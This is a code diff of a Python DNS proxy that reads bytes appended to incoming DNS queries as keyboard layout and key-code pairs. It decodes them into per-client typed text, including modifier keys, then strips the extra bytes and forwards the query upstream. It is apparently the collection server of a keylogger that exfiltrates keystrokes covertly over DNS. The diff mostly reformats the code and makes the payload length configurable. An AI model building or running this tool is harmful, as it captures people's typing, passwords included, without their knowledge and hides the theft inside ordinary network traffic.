@@ -1,6 +1,5 @@
 import argparse
 import os
-import json
 import socket
 import time
 
@@ -8,17 +7,15 @@ import yaml
 from dnslib import QTYPE, RCODE, DNSRecord
 from dnslib.server import BaseResolver, DNSHandler, DNSLogger, DNSServer
 
-LOCAL_HOST = "0.0.0.0"  # Listen on all available interfaces
-LOCAL_PORT = 53  # Port for the UDP proxy to listen on
-REMOTE_HOST = "8.8.8.8"  # Replace with the remote server's IP
-REMOTE_PORT = 53  # Port of the remote server
 qw_key_map = yaml.safe_load(open("qwerty.yml"))
 az_key_map = yaml.safe_load(open("azerty.yml"))
 key_maps = {0: qw_key_map, 1: az_key_map}
 
-mods_str_rep = {k: {v["keys"][mod]:mod for mod in v["mod"]} for k,v in key_maps.items() }
+mods_str_rep = {
+    k: {v["keys"][mod]: mod for mod in v["mod"]} for k, v in key_maps.items()
+}
 keys = {}
-
+PAYLOAD_LEN = int(os.environ["PAYLOAD_LEN"])
 
 
 class ProxyResolver(BaseResolver):
@@ -35,9 +32,13 @@ class ProxyResolver(BaseResolver):
                 reply.header.rcode = RCODE.NXDOMAIN
             else:
                 if handler.protocol == "udp":
-                    proxy_r = request.send(self.address, self.port, timeout=self.timeout)
+                    proxy_r = request.send(
+                        self.address, self.port, timeout=self.timeout
+                    )
                 else:
-                    proxy_r = request.send(self.address, self.port, tcp=True, timeout=self.timeout)
+                    proxy_r = request.send(
+                        self.address, self.port, tcp=True, timeout=self.timeout
+                    )
                 reply = DNSRecord.parse(proxy_r)
         except socket.timeout:
             reply = request.reply()
@@ -54,14 +55,21 @@ class PassthroughDNSHandler(DNSHandler):
             keys[client_ip] = []
 
         try:
-            payload = data[-8:]
+            payload = data[-PAYLOAD_LEN:]
             key_events = zip(payload[::2], payload[1::2])
             for layout, code in key_events:
                 if key_map := key_maps.get(layout):
-                    if len(keys[client_ip]) >0 and keys[client_ip][-1] in mods_str_rep[layout]:
-                        last_mod_str= keys[client_ip].pop()
-                        mod = mods_str_rep[layout][last_mod_str ]
-                        keys[client_ip].append(key_map["mod"][mod].get(code, f"{last_mod_str} {key_map['keys'].get(code, '')} "))
+                    if (
+                        len(keys[client_ip]) > 0
+                        and keys[client_ip][-1] in mods_str_rep[layout]
+                    ):
+                        last_mod_str = keys[client_ip].pop()
+                        mod = mods_str_rep[layout][last_mod_str]
+                        keys[client_ip].append(
+                            key_map["mod"][mod].get(
+                                code, f"{last_mod_str} {key_map['keys'].get(code, '')} "
+                            )
+                        )
                     else:
                         keys[client_ip].append(key_map["keys"].get(code, ""))
 
@@ -69,14 +77,15 @@ class PassthroughDNSHandler(DNSHandler):
             for client_ip, k in keys.items():
                 res[client_ip] = "".join(k)
             os.system("clear")
-            for c,k in res.items():
+            for c, k in res.items():
                 print(f"{c}: {k}")
-            
+
         except Exception as e:
             print(e)
             pass
 
-        data = bytearray(data[:-8])
+        data = bytearray(data[:-PAYLOAD_LEN])
+        # add recursion byte
         data[2:4] = bytes.fromhex("0120")
 
         request = DNSRecord.parse(bytes(data))
@@ -102,7 +111,12 @@ def send_udp(data, host, port):
 if __name__ == "__main__":
     p = argparse.ArgumentParser(description="DNS Proxy")
     p.add_argument(
-        "--port", "-p", type=int, default=53, metavar="<port>", help="Local proxy port (default:53)"
+        "--port",
+        "-p",
+        type=int,
+        default=53,
+        metavar="<port>",
+        help="Local proxy port (default:53)",
     )
     p.add_argument(
         "--address",
@@ -118,61 +132,34 @@ if __name__ == "__main__":
         metavar="<dns server:port>",
         help="Upstream DNS server:port (default:8.8.8.8:53)",
     )
-    p.add_argument(
-        "--tcp", action="store_true", default=False, help="TCP proxy (default: UDP only)"
-    )
-    p.add_argument(
-        "--timeout",
-        "-o",
-        type=float,
-        default=5,
-        metavar="<timeout>",
-        help="Upstream timeout (default: 5s)",
-    )
-    p.add_argument(
-        "--strip-aaaa",
-        action="store_true",
-        default=False,
-        help="Retuen NXDOMAIN for AAAA queries (default: off)",
-    )
-    p.add_argument(
-        "--passthrough",
-        action="store_true",
-        default=False,
-        help="Dont decode/re-encode request/response (default: off)",
-    )
+
     p.add_argument(
         "--log",
-        default="request,reply,truncated,error",
-        help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)",
+        default="error",
+        help="Log hooks to enable (default: +error)",
     )
-    p.add_argument(
-        "--log-prefix",
-        action="store_true",
-        default=False,
-        help="Log prefix (timestamp/handler/resolver) (default: False)",
-    )
+
     args = p.parse_args()
 
-    args.dns, _, args.dns_port = args.upstream.partition(":")
-    args.dns_port = int(args.dns_port or 53)
+    dns, _, dns_port = args.upstream.partition(":")
+    dns_port = int(dns_port or 53)
 
     print(
         "Starting Proxy Resolver (%s:%d -> %s:%d) [%s]"
         % (
             args.address or "*",
             args.port,
-            args.dns,
-            args.dns_port,
-            "UDP/TCP" if args.tcp else "UDP",
+            dns,
+            dns_port,
+            "UDP",
         )
     )
 
     udp_server = DNSServer(
-        ProxyResolver(args.dns, args.dns_port, args.timeout, args.strip_aaaa),
+        ProxyResolver(dns, dns_port, timeout=5, strip_aaaa=False),
         port=args.port,
         address=args.address,
-        logger=DNSLogger(args.log, prefix=args.log_prefix),
+        logger=DNSLogger(args.log, prefix=True),
         handler=PassthroughDNSHandler,
     )
     udp_server.start()
